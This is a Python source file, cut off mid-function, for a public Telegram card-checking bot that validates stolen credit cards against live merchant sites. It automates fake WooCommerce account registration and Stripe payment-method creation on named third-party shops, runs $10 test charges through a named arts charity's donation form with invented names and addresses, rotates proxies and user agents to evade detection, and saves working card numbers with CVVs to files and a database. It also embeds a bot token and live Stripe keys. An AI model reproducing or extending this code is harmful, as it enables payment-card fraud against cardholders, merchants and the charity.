#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# AUTO SHOPIFY v12.0 + STRIPE AUTH (PARALLEL PIPELINE)
# OTP = DECLINE - SITIOS APROBADOS GUARDADOS PERMANENTEMENTE

import requests
import json
import re
import time
import random
import os
import socket
import urllib3
import threading
import base64
from datetime import datetime
from io import BytesIO
from concurrent.futures import ThreadPoolExecutor, as_completed
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import logging
import sqlite3
from typing import Dict, List
from queue import Queue
from bs4 import BeautifulSoup
import aiohttp
import asyncio
import uuid
import string
from fake_useragent import UserAgent

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configure logging - SILENT MODE
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.ERROR
)
logger = logging.getLogger(__name__)

# ============================================
# BOT CONFIGURATION
# ============================================
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8503937259:AAEApOgsbu34qw5J6OKz1dxgvRzrFv9IQdE")
bot = telebot.TeleBot(BOT_TOKEN)

# Public bot - no owner restriction

# Data directory (Railway volume or local)
DATA_DIR = os.environ.get("DATA_DIR", ".")
os.makedirs(DATA_DIR, exist_ok=True)

# Data files
SITES_FILE = os.path.join(DATA_DIR, "sites.json")
PROXIES_FILE = os.path.join(DATA_DIR, "proxies.json")
CARDS_FILE = os.path.join(DATA_DIR, "cards.json")
HITS_FILE = os.path.join(DATA_DIR, "hits.json")
PERMANENT_SITES_FILE = os.path.join(DATA_DIR, "permanent_sites.json")
STRIPE_CARDS_FILE = os.path.join(DATA_DIR, "stripe_cards.json")
STRIPE_HITS_FILE = os.path.join(DATA_DIR, "stripe_hits.json")
SC_CARDS_FILE = os.path.join(DATA_DIR, "sc_cards.json")
SC_HITS_FILE = os.path.join(DATA_DIR, "sc_hits.json")
B3_CARDS_FILE = os.path.join(DATA_DIR, "b3_cards.json")
B3_HITS_FILE = os.path.join(DATA_DIR, "b3_hits.json")
API_URL = os.environ.get("API_URL", "http://108.165.12.183:8081")
MAX_CARDS_PER_BATCH = 999999

# Concurrency settings
DEFAULT_MAX_WORKERS = 3
REQUEST_TIMEOUT = 25
PROXY_CHECK_TIMEOUT = 3
CACHE_BIN_RESULTS = True

# DELAY ENTRE CHECKS
DELAY_BETWEEN_CHECKS = 5

# Selectable modes
current_mode = "extremo"
mode_workers = {
    "seguro": 1,
    "rapido": 3,
    "extremo": 5
}
PARALLEL_WORKERS = mode_workers[current_mode]
SC_PARALLEL_WORKERS = 1
B3_PARALLEL_WORKERS = 1

# Update cada 5 cards
UPDATE_BATCH_SIZE = 5

# Proxy checker settings
PROXY_CHECK_WORKERS = 50
PROXY_SOCKET_TIMEOUT = 2

# Rate limit settings
BATCH_SIZE = 10
BATCH_DELAY = 5
last_batch_time = 0
pending_approved = []
batch_lock = threading.Lock()

# Global variables
current_max_workers = DEFAULT_MAX_WORKERS
silent_pc_running = False
silent_pc_thread = None
SILENT_PC_INTERVAL = 7200

# Mass check variables
mass_check_running = False
stripe_mass_running = False
mass_paused = False
current_mass_msg = None
current_mass_chat_id = None
stop_mass_flag = False

# Cache
stored_results = {}
bin_cache = {}
bin_cache_expiry = 3600
hits_list = []
stripe_hits_list = []
sc_hits_list = []
b3_hits_list = []
last_dead_proxies = []
pending_file_cards = {}

# Connection pooling - reusable HTTP session
http_session = requests.Session()
http_adapter = requests.adapters.HTTPAdapter(
    pool_connections=10,
    pool_maxsize=20,
    max_retries=requests.adapters.Retry(total=2, backoff_factor=0.3)
)
http_session.mount('http://', http_adapter)
http_session.mount('https://', http_adapter)

# Proxy auto-rotation
failed_proxies = {}
PROXY_FAIL_THRESHOLD = 3
PROXY_FAIL_COOLDOWN = 300

# Site performance tracking
site_stats = {}
SITE_AUTO_CLEAN_INTERVAL = 50
site_check_counter = 0
SITE_MIN_CHECKS = 5
SITE_FAIL_RATE_THRESHOLD = 0.85

# Stripe Auth sites
STRIPE_SITES = [
    "https://prontoheat.com",
    "https://deveneys.ie"
]

# Stripe Charge $10 configuration (GiveWP + Stripe Elements)
SC_SITE_URL = "https://ashevillecreativearts.org"
SC_DONATION_PAGE = f"{SC_SITE_URL}/get-involved/donate-to-our-partner-organizations/donate-to-cine-casual/"
SC_AJAX_URL = f"{SC_SITE_URL}/wp-admin/admin-ajax.php"
SC_STRIPE_PK = "pk_live_SMtnnvlq4TpJelMdklNha8iD"
SC_STRIPE_ACCT = "acct_1H46cvJLC1CnQZhf"
SC_FORM_ID = "2976"
SC_FORM_TITLE = "Donate Form - Cine Casual"
SC_DONATE_AMOUNT = "10.00"
SC_FIRST_NAMES = ["James","Mary","John","Patricia","Robert","Jennifer","Michael","Linda",
                   "David","Elizabeth","William","Barbara","Richard","Susan","Joseph","Jessica",
                   "Thomas","Sarah","Charles","Karen","Daniel","Lisa","Mark","Nancy"]
SC_LAST_NAMES = ["Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis",
                  "Rodriguez","Martinez","Wilson","Anderson","Taylor","Thomas","Moore","Jackson"]
SC_ADDRESSES = [
    {"line1": "236 W 30TH", "city": "NEW YORK", "state": "NY", "zip": "10001"},
    {"line1": "100 BROADWAY", "city": "NEW YORK", "state": "NY", "zip": "10005"},
    {"line1": "742 EVERGREEN TER", "city": "SPRINGFIELD", "state": "IL", "zip": "62704"},
    {"line1": "123 MAIN ST", "city": "LOS ANGELES", "state": "CA", "zip": "90001"},
    {"line1": "456 OAK AVE", "city": "CHICAGO", "state": "IL", "zip": "60601"},
    {"line1": "789 PINE RD", "city": "HOUSTON", "state": "TX", "zip": "77001"},
    {"line1": "321 ELM ST", "city": "PHOENIX", "state": "AZ", "zip": "85001"},
    {"line1": "654 MAPLE DR", "city": "MIAMI", "state": "FL", "zip": "33101"},
]
sc_mass_running = False
sc_form_hash = None
sc_http_session = None
b3_mass_running = False
b3_auth_fp = None
b3_apm_nonce = None
b3_config_data = None
b3_http_session = None
b3_session_pool = []
B3_POOL_SIZE = 2
B3_RATE_LIMIT_DELAY = 22

# ============================================
# COUNTRY FLAGS
# ============================================

COUNTRY_FLAGS = {
    'AF': '🇦🇫', 'AL': '🇦🇱', 'DZ': '🇩🇿', 'AD': '🇦🇩', 'AO': '🇦🇴', 'AG': '🇦🇬', 'AR': '🇦🇷', 'AM': '🇦🇲',
    'AU': '🇦🇺', 'AT': '🇦🇹', 'AZ': '🇦🇿', 'BS': '🇧🇸', 'BH': '🇧🇭', 'BD': '🇧🇩', 'BB': '🇧🇧', 'BY': '🇧🇾',
    'BE': '🇧🇪', 'BZ': '🇧🇿', 'BJ': '🇧🇯', 'BT': '🇧🇹', 'BO': '🇧🇴', 'BA': '🇧🇦', 'BW': '🇧🇼', 'BR': '🇧🇷',
    'BN': '🇧🇳', 'BG': '🇧🇬', 'BF': '🇧🇫', 'BI': '🇧🇮', 'KH': '🇰🇭', 'CM': '🇨🇲', 'CA': '🇨🇦', 'CV': '🇨🇻',
    'CF': '🇨🇫', 'TD': '🇹🇩', 'CL': '🇨🇱', 'CN': '🇨🇳', 'CO': '🇨🇴', 'KM': '🇰🇲', 'CG': '🇨🇬', 'CD': '🇨🇩',
    'CR': '🇨🇷', 'CI': '🇨🇮', 'HR': '🇭🇷', 'CU': '🇨🇺', 'CY': '🇨🇾', 'CZ': '🇨🇿', 'DK': '🇩🇰', 'DJ': '🇩🇯',
    'DM': '🇩🇲', 'DO': '🇩🇴', 'EC': '🇪🇨', 'EG': '🇪🇬', 'SV': '🇸🇻', 'GQ': '🇬🇶', 'ER': '🇪🇷', 'EE': '🇪🇪',
    'ET': '🇪🇹', 'FJ': '🇫🇯', 'FI': '🇫🇮', 'FR': '🇫🇷', 'GA': '🇬🇦', 'GM': '🇬🇲', 'GE': '🇬🇪', 'DE': '🇩🇪',
    'GH': '🇬🇭', 'GR': '🇬🇷', 'GD': '🇬🇩', 'GT': '🇬🇹', 'GN': '🇬🇳', 'GW': '🇬🇼', 'GY': '🇬🇾', 'HT': '🇭🇹',
    'HN': '🇭🇳', 'HU': '🇭🇺', 'IS': '🇮🇸', 'IN': '🇮🇳', 'ID': '🇮🇩', 'IR': '🇮🇷', 'IQ': '🇮🇶', 'IE': '🇮🇪',
    'IL': '🇮🇱', 'IT': '🇮🇹', 'JM': '🇯🇲', 'JP': '🇯🇵', 'JO': '🇯🇴', 'KZ': '🇰🇿', 'KE': '🇰🇪', 'KI': '🇰🇮',
    'KP': '🇰🇵', 'KR': '🇰🇷', 'KW': '🇰🇼', 'KG': '🇰🇬', 'LA': '🇱🇦', 'LV': '🇱🇻', 'LB': '🇱🇧', 'LS': '🇱🇸',
    'LR': '🇱🇷', 'LY': '🇱🇾', 'LI': '🇱🇮', 'LT': '🇱🇹', 'LU': '🇱🇺', 'MK': '🇲🇰', 'MG': '🇲🇬', 'MW': '🇲🇼',
    'MY': '🇲🇾', 'MV': '🇲🇻', 'ML': '🇲🇱', 'MT': '🇲🇹', 'MH': '🇲🇭', 'MR': '🇲🇷', 'MU': '🇲🇺', 'MX': '🇲🇽',
    'FM': '🇫🇲', 'MD': '🇲🇩', 'MC': '🇲🇨', 'MN': '🇲🇳', 'ME': '🇲🇪', 'MA': '🇲🇦', 'MZ': '🇲🇿', 'MM': '🇲🇲',
    'NA': '🇳🇦', 'NR': '🇳🇷', 'NP': '🇳🇵', 'NL': '🇳🇱', 'NZ': '🇳🇿', 'NI': '🇳🇮', 'NE': '🇳🇪', 'NG': '🇳🇬',
    'NO': '🇳🇴', 'OM': '🇴🇲', 'PK': '🇵🇰', 'PW': '🇵🇼', 'PS': '🇵🇸', 'PA': '🇵🇦', 'PG': '🇵🇬', 'PY': '🇵🇾',
    'PE': '🇵🇪', 'PH': '🇵🇭', 'PL': '🇵🇱', 'PT': '🇵🇹', 'QA': '🇶🇦', 'RO': '🇷🇴', 'RU': '🇷🇺', 'RW': '🇷🇼',
    'KN': '🇰🇳', 'LC': '🇱🇨', 'VC': '🇻🇨', 'WS': '🇼🇸', 'SM': '🇸🇲', 'ST': '🇸🇹', 'SA': '🇸🇦', 'SN': '🇸🇳',
    'RS': '🇷🇸', 'SC': '🇸🇨', 'SL': '🇸🇱', 'SG': '🇸🇬', 'SK': '🇸🇰', 'SI': '🇸🇮', 'SB': '🇸🇧', 'SO': '🇸🇴',
    'ZA': '🇿🇦', 'SS': '🇸🇸', 'ES': '🇪🇸', 'LK': '🇱🇰', 'SD': '🇸🇩', 'SR': '🇸🇷', 'SZ': '🇸🇿', 'SE': '🇸🇪',
    'CH': '🇨🇭', 'SY': '🇸🇾', 'TW': '🇹🇼', 'TJ': '🇹🇯', 'TZ': '🇹🇿', 'TH': '🇹🇭', 'TL': '🇹🇱', 'TG': '🇹🇬',
    'TO': '🇹🇴', 'TT': '🇹🇹', 'TN': '🇹🇳', 'TR': '🇹🇷', 'TM': '🇹🇲', 'TV': '🇹🇻', 'UG': '🇺🇬', 'UA': '🇺🇦',
    'AE': '🇦🇪', 'GB': '🇬🇧', 'US': '🇺🇸', 'UY': '🇺🇾', 'UZ': '🇺🇿', 'VU': '🇻🇺', 'VA': '🇻🇦', 'VE': '🇻🇪',
    'VN': '🇻🇳', 'YE': '🇾🇪', 'ZM': '🇿🇲', 'ZW': '🇿🇼'
}

# ============================================
# SQLITE DATABASE CLASS
# ============================================

class SQLiteBackup:
    def __init__(self, db_path: str = None):
        self.db_path = db_path or os.path.join(DATA_DIR, "shopify_bot_backup.db")
        self.conn = None
        self.setup_database()
    
    def get_connection(self):
        if self.conn is None:
            self.conn = sqlite3.connect(self.db_path, check_same_thread=False)
            self.conn.row_factory = sqlite3.Row
        return self.conn
    
    def setup_database(self):
        conn = self.get_connection()
        cursor = conn.cursor()
        
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS hits_backup (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                cc TEXT NOT NULL,
                month TEXT NOT NULL,
                year TEXT NOT NULL,
                cvv TEXT NOT NULL,
                category TEXT NOT NULL,
                status_msg TEXT,
                response_msg TEXT,
                gateway TEXT,
                price TEXT,
                elapsed REAL,
                bin_info TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS stripe_hits_backup (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                cc TEXT NOT NULL,
                month TEXT NOT NULL,
                year TEXT NOT NULL,
                cvv TEXT NOT NULL,
                category TEXT NOT NULL,
                status_msg TEXT,
                response_msg TEXT,
                gateway TEXT,
                price TEXT,
                elapsed REAL,
                bin_info TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS stats_daily (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                date TEXT UNIQUE NOT NULL,
                total_checks INTEGER DEFAULT 0,
                total_approved INTEGER DEFAULT 0,
                total_declined INTEGER DEFAULT 0,
                total_errors INTEGER DEFAULT 0,
                stripe_checks INTEGER DEFAULT 0,
                stripe_approved INTEGER DEFAULT 0,
                mode_used TEXT DEFAULT 'fast'
            )
        """)
        
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS permanent_sites (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                url TEXT UNIQUE NOT NULL,
                success_count INTEGER DEFAULT 1,
                first_success TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_success TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        
        cursor.execute("CREATE INDEX IF NOT EXISTS idx_hits_timestamp ON hits_backup(timestamp)")
        cursor.execute("CREATE INDEX IF NOT EXISTS idx_hits_category ON hits_backup(category)")
        cursor.execute("CREATE INDEX IF NOT EXISTS idx_hits_cc ON hits_backup(cc)")
        cursor.execute("CREATE INDEX IF NOT EXISTS idx_stripe_hits_timestamp ON stripe_hits_backup(timestamp)")
        cursor.execute("CREATE INDEX IF NOT EXISTS idx_stripe_hits_category ON stripe_hits_backup(category)")
        cursor.execute("CREATE INDEX IF NOT EXISTS idx_permanent_sites_url ON permanent_sites(url)")
        cursor.execute("CREATE INDEX IF NOT EXISTS idx_stats_daily_date ON stats_daily(date)")
        
        conn.commit()
    
    def save_hit_backup(self, hit_data: Dict, gateway: str = "shopify"):
        conn = self.get_connection()
        cursor = conn.cursor()
        
        if gateway == "stripe_auth":
            table = "stripe_hits_backup"
        else:
            table = "hits_backup"
        
        cursor.execute(f"""
            INSERT INTO {table} (cc, month, year, cvv, category, status_msg, 
                           response_msg, gateway, price, elapsed, bin_info)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        """, (
            hit_data.get('cc', ''), hit_data.get('month', ''), 
            hit_data.get('year', ''), hit_data.get('cvv', ''),
            hit_data.get('category', ''), hit_data.get('status_msg', ''), 
            hit_data.get('response_msg', ''),
            hit_data.get('gateway', ''), hit_data.get('price', '$0.95'),
            hit_data.get('elapsed', 0), json.dumps(hit_data.get('bin_info', {}))
        ))
        
        conn.commit()
    
    def update_daily_stats(self, total_checks: int, approved: int, declined: int, errors: int, 
                           stripe_checks: int = 0, stripe_approved: int = 0,
                           mode: str = "fast"):
        conn = self.get_connection()
        cursor = conn.cursor()
        today = datetime.now().strftime('%Y-%m-%d')
        cursor.execute("""
            INSERT INTO stats_daily (date, total_checks, total_approved, total_declined, total_errors, 
                                     stripe_checks, stripe_approved, mode_used)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
            ON CONFLICT(date) DO UPDATE SET
                total_checks = total_checks + excluded.total_checks,
                total_approved = total_approved + excluded.total_approved,
                total_declined = total_declined + excluded.total_declined,
                total_errors = total_errors + excluded.total_errors,
                stripe_checks = stripe_checks + excluded.stripe_checks,
                stripe_approved = stripe_approved + excluded.stripe_approved,
                mode_used = excluded.mode_used
        """, (today, total_checks, approved, declined, errors, stripe_checks, stripe_approved, mode))
        conn.commit()
    
    def add_permanent_site(self, url: str):
        conn = self.get_connection()
        cursor = conn.cursor()
        cursor.execute("""
            INSERT INTO permanent_sites (url, success_count, last_success)
            VALUES (?, 1, CURRENT_TIMESTAMP)
            ON CONFLICT(url) DO UPDATE SET
                success_count = success_count + 1,
                last_success = CURRENT_TIMESTAMP
        """, (url,))
        conn.commit()
    
    def is_permanent_site(self, url: str) -> bool:
        conn = self.get_connection()
        cursor = conn.cursor()
        cursor.execute("SELECT 1 FROM permanent_sites WHERE url = ?", (url,))
        return cursor.fetchone() is not None
    
    def get_permanent_sites(self) -> List[Dict]:
        conn = self.get_connection()
        cursor = conn.cursor()
        cursor.execute("SELECT url, success_count, first_success, last_success FROM permanent_sites ORDER BY success_count DESC")
        return [dict(row) for row in cursor.fetchall()]
    
    def get_today_stats(self) -> Dict:
        conn = self.get_connection()
        cursor = conn.cursor()
        today = datetime.now().strftime('%Y-%m-%d')
        cursor.execute("SELECT * FROM stats_daily WHERE date = ?", (today,))
        row = cursor.fetchone()
        if row:
            return dict(row)
        return {"total_checks": 0, "total_approved": 0, "total_declined": 0, "total_errors": 0, 
                "stripe_checks": 0, "stripe_approved": 0, "mode_used": "fast"}

sqlite_backup = SQLiteBackup()

# ============================================
# STRIPE AUTH FUNCTIONS (CON TIEMPO REAL CORREGIDO)
# ============================================

def generate_random_email():
    username = ''.join(random.choices(string.ascii_lowercase, k=random.randint(8, 12)))
    number = random.randint(100, 9999)
    domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'protonmail.com']
    return f"{username}{number}@{random.choice(domains)}"

def generate_guid():
    return str(uuid.uuid4())

def gets(s, start, end):
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except (ValueError, AttributeError):
        return None

def normalize_url_stripe(url):
    url = url.strip()
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    url = url.rstrip('/')
    if '/my-account' not in url.lower():
        url += '/my-account'
    if not url.endswith('/'):
        url += '/'
    return url

def get_random_stripe_site():
    return random.choice(STRIPE_SITES)

async def check_stripe_auth_async(cc, month, year, cvv, site_url, start_time):
    """Stripe Auth Gateway - GRATIS (solo validación) - Con tiempo real desde el inicio"""
    ua = UserAgent()
    
    card_data = {
        'number': cc,
        'exp_month': month,
        'exp_year': year[-2:] if len(year) == 4 else year,
        'cvc': cvv
    }
    
    try:
        base_url = normalize_url_stripe(site_url)
        
        timeout = aiohttp.ClientTimeout(total=70)
        connector = aiohttp.TCPConnector(ssl=False)
        
        async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
            from urllib.parse import urlparse
            parsed = urlparse(base_url)
            domain = f"{parsed.scheme}://{parsed.netloc}"
            
            email = generate_random_email()
            
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'user-agent': ua.random,
            }
            
            resp = await session.get(base_url, headers=headers)
            resp_text = await resp.text()
            
            register_nonce = (
                gets(resp_text, 'woocommerce-register-nonce" value="', '"') or
                gets(resp_text, 'id="woocommerce-register-nonce" value="', '"') or
                gets(resp_text, 'name="woocommerce-register-nonce" value="', '"')
            )
            
            if register_nonce:
                username = email.split('@')[0]
                password = f"Pass{random.randint(100000, 999999)}!"
                
                register_data = {
                    'email': email,
                    'wc_order_attribution_source_type': 'typein',
                    'wc_order_attribution_referrer': '(none)',
                    'wc_order_attribution_utm_campaign': '(none)',
                    'wc_order_attribution_utm_source': '(direct)',
                    'wc_order_attribution_utm_medium': '(none)',
                    'wc_order_attribution_utm_content': '(none)',
                    'wc_order_attribution_utm_id': '(none)',
                    'wc_order_attribution_utm_term': '(none)',
                    'wc_order_attribution_utm_source_platform': '(none)',
                    'wc_order_attribution_utm_creative_format': '(none)',
                    'wc_order_attribution_utm_marketing_tactic': '(none)',
                    'wc_order_attribution_session_entry': base_url,
                    'wc_order_attribution_session_start_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                    'wc_order_attribution_session_pages': '1',
                    'wc_order_attribution_session_count': '1',
                    'wc_order_attribution_user_agent': headers['user-agent'],
                    'woocommerce-register-nonce': register_nonce,
                    '_wp_http_referer': '/my-account/',
                    'register': 'Register',
                }
                
                await session.post(base_url, headers=headers, data=register_data)
            
            add_payment_url = base_url.rstrip('/') + '/add-payment-method/'
            if '/my-account/add-payment-method' not in add_payment_url:
                add_payment_url = f"{domain}/my-account/add-payment-method/"
            
            headers = {'user-agent': ua.random}
            resp = await session.get(add_payment_url, headers=headers)
            payment_page_text = await resp.text()
            
            add_card_nonce = (
                gets(payment_page_text, 'createAndConfirmSetupIntentNonce":"', '"') or
                gets(payment_page_text, 'add_card_nonce":"', '"') or
                gets(payment_page_text, 'name="add_payment_method_nonce" value="', '"') or
                gets(payment_page_text, 'wc_stripe_add_payment_method_nonce":"', '"')
            )
            
            stripe_key = (
                gets(payment_page_text, '"key":"pk_', '"') or
                gets(payment_page_text, 'data-key="pk_', '"') or
                gets(payment_page_text, 'stripe_key":"pk_', '"') or
                gets(payment_page_text, 'publishable_key":"pk_', '"')
            )
            
            if not stripe_key:
                pk_match = re.search(r'pk_live_[a-zA-Z0-9]{24,}', payment_page_text)
                if pk_match:
                    stripe_key = pk_match.group(0)
            
            if not stripe_key:
                stripe_key = 'pk_live_VkUTgutos6iSUgA9ju6LyT7f00xxE5JjCv'
            elif not stripe_key.startswith('pk_'):
                stripe_key = 'pk_' + stripe_key
            
            stripe_headers = {
                'accept': 'application/json',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'user-agent': ua.random
            }
            
            stripe_data = {
                'type': 'card',
                'card[number]': card_data['number'],
                'card[cvc]': card_data['cvc'],
                'card[exp_month]': card_data['exp_month'],
                'card[exp_year]': card_data['exp_year'],
                'allow_redisplay': 'unspecified',
                'billing_details[address][country]': 'AU',
                'payment_user_agent': 'stripe.js/5e27053bf5; stripe-js-v3/5e27053bf5; payment-element; deferred-intent',
                'referrer': domain,
                'client_attribution_metadata[client_session_id]': generate_guid(),
                'client_attribution_metadata[merchant_integration_source]': 'elements',
                'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
                'client_attribution_metadata[merchant_integration_version]': '2021',
                'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
                'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
                'client_attribution_metadata[elements_session_config_id]': generate_guid(),
                'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
                'guid': generate_guid(),
                'muid': generate_guid(),
                'sid': generate_guid(),
                'key': stripe_key,
                '_stripe_version': '2024-06-20',
            }
            
            pm_resp = await session.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=stripe_data)
            pm_json = await pm_resp.json()
            
            if 'error' in pm_json:
                error_msg = pm_json['error'].get('message', 'Unknown error')
                error_code = pm_json['error'].get('code', 'unknown')
                
                if 'cvc' in error_msg.lower() or 'cvv' in error_msg.lower():
                    return ("CVV", f"❌ CVV incorrecto", error_msg, "FREE", "STRIPE-AUTH")
                elif 'insufficient' in error_msg.lower():
                    return ("LIVE", f"⚠️ LIVE - Fondos insuficientes", error_msg, "FREE", "STRIPE-AUTH")
                elif 'requiresaction' in error_msg.lower() or '3d' in error_msg.lower():
                    return ("3DS", f"✅ 3DS Required - Tarjeta válida", error_msg, "FREE", "STRIPE-AUTH")
                else:
                    return ("DECLINED", f"❌ Declinado", error_msg, "FREE", "STRIPE-AUTH")
            
            pm_id = pm_json.get('id')
            if not pm_id:
                return ("ERROR", "❌ Failed to create Payment Method", str(pm_json), "FREE", "STRIPE-AUTH")
            
            confirm_headers = {
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': domain,
                'x-requested-with': 'XMLHttpRequest',
                'user-agent': ua.random
            }
            
            endpoints = [
                {'url': f"{domain}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent", 'data': {'wc-stripe-payment-method': pm_id}},
                {'url': f"{domain}/wp-admin/admin-ajax.php", 'data': {'action': 'wc_stripe_create_and_confirm_setup_intent', 'wc-stripe-payment-method': pm_id}},
                {'url': f"{domain}/?wc-ajax=add_payment_method", 'data': {'wc-stripe-payment-method': pm_id, 'payment_method': 'stripe'}},
            ]
            
            for endp in endpoints:
                if not add_card_nonce:
                    continue
                
                if 'add_payment_method' in endp['url']:
                    endp['data']['woocommerce-add-payment-method-nonce'] = add_card_nonce
                else:
                    endp['data']['_ajax_nonce'] = add_card_nonce
                
                endp['data']['wc-stripe-payment-type'] = 'card'
                
                try:
                    res = await session.post(endp['url'], data=endp['data'], headers=confirm_headers)
                    text = await res.text()
                    
                    if 'success' in text:
                        js = json.loads(text)
                        if js.get('success'):
                            status = js.get('data', {}).get('status')
                            response_parts = []
                            if status:
                                response_parts.append(f"Status: {status}")
                            if js.get('data', {}).get('payment_method'):
                                response_parts.append(f"PM: {js['data']['payment_method']}")
                            
                            full_response = " | ".join(response_parts) if response_parts else "succeeded"
                            
                            if status == 'succeeded':
                                return ("LIVE", "✅ LIVE - Card added successfully", full_response, "FREE", "STRIPE-AUTH")
                            elif status == 'requires_action' or status == 'requiresaction':
                                return ("3DS", "✅ 3DS Required - Valid card", full_response, "FREE", "STRIPE-AUTH")
                            return ("LIVE", f"✅ LIVE - Status: {status}", full_response, "FREE", "STRIPE-AUTH")
                        else:
                            error_msg = js.get('data', {}).get('error', {}).get('message', 'Declined')
                            error_code = js.get('data', {}).get('error', {}).get('code', 'unknown')
                            if 'requiresaction' in error_msg.lower() or '3d' in error_msg.lower():
                                return ("3DS", f"✅ 3DS Required", error_msg, "FREE", "STRIPE-AUTH")
                            return ("DECLINED", f"❌ {error_msg}", error_msg, "FREE", "STRIPE-AUTH")
                except:
                    continue
            
            return ("ERROR", "❌ Failed to confirm payment method", pm_id, "FREE", "STRIPE-AUTH")
            
    except Exception as e:
        return ("ERROR", f"❌ System Error: {str(e)}", str(e), "FREE", "STRIPE-AUTH")

def check_stripe_auth(cc, month, year, cvv):
    """Wrapper síncrono para Stripe Auth - TIEMPO REAL CORREGIDO"""
    site_url = get_random_stripe_site()
    start_time = time.time()  # Tiempo real desde el inicio de la función
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        result = loop.run_until_complete(check_stripe_auth_async(cc, month, year, cvv, site_url, start_time))
        loop.close()
        # Calcular tiempo real transcurrido
        real_elapsed = time.time() - start_time
        # Devolver el resultado con el tiempo real
        return (result[0], result[1], result[2], result[3], result[4], round(real_elapsed, 2))
    except Exception as e:
        real_elapsed = time.time() - start_time
        return ("ERROR", "Failed to check", str(e), "FREE", "STRIPE-AUTH", round(real_elapsed, 2))

# ============================================
# STRIPE AUTH CARD MANAGEMENT
# ============================================

def load_stripe_cards():
    return safe_json_load(STRIPE_CARDS_FILE, [])

def save_stripe_cards(cards):
    return safe_json_save(STRIPE_CARDS_FILE, cards)

def add_stripe_card(cc, month, year, cvv):
    cards = load_stripe_cards()
    card_str = f"{cc}|{month}|{year}|{cvv}"
    if card_str not in cards:
        cards.append(card_str)
        save_stripe_cards(cards)
        return True
    return False

def clear_stripe_cards():
    save_stripe_cards([])

def get_all_stripe_cards():
    return load_stripe_cards()

def delete_stripe_card(card_str):
    cards = load_stripe_cards()
    if card_str in cards:
        cards.remove(card_str)
        save_stripe_cards(cards)
        return True
    return False

def load_stripe_hits():
    return safe_json_load(STRIPE_HITS_FILE, [])

def save_stripe_hit(hit_data):
    hits = load_stripe_hits()
    hits.append(hit_data)
    safe_json_save(STRIPE_HITS_FILE, hits)
    global stripe_hits_list
    stripe_hits_list.append(hit_data)
    try:
        sqlite_backup.save_hit_backup(hit_data, "stripe_auth")
    except:
        pass

def get_stripe_hits():
    global stripe_hits_list
    if not stripe_hits_list:
        stripe_hits_list = load_stripe_hits()
    return stripe_hits_list

# ============================================
# STRIPE CHARGE GATEWAY
# ============================================

def sc_fetch_form_nonce(session):
    """Get fresh GiveWP form hash via AJAX nonce reset"""
    try:
        headers = {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": SC_SITE_URL,
            "Referer": SC_DONATION_PAGE,
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36",
        }
        data = {
            "action": "give_donation_form_reset_all_nonce",
            "give_form_id": SC_FORM_ID,
        }
        r = session.post(SC_AJAX_URL, headers=headers, data=data, timeout=30, verify=False)
        if r.status_code == 200:
            resp = r.json()
            if resp.get("success"):
                return resp.get("data", {}).get("give_form_hash", "")
    except:
        pass
    return ""

def sc_create_payment_method(card_number, exp_month, exp_year, cvc, name, email, addr):
    """Create Stripe payment method via Elements API"""
    session_id = str(uuid.uuid4())
    time_on_page = random.randint(15000, 60000)
    
    headers = {
        "Accept": "application/json",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://js.stripe.com",
        "Referer": "https://js.stripe.com/",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36",
    }
    
    data = {
        "type": "card",
        "billing_details[name]": name,
        "billing_details[email]": email,
        "billing_details[address][line1]": addr["line1"],
        "billing_details[address][line2]": "",
        "billing_details[address][city]": addr["city"],
        "billing_details[address][state]": addr["state"],
        "billing_details[address][postal_code]": addr["zip"],
        "billing_details[address][country]": "US",
        "card[number]": card_number,
        "card[cvc]": cvc,
        "card[exp_month]": exp_month,
        "card[exp_year]": exp_year,
        "guid": "NA",
        "muid": "NA",
        "sid": "NA",
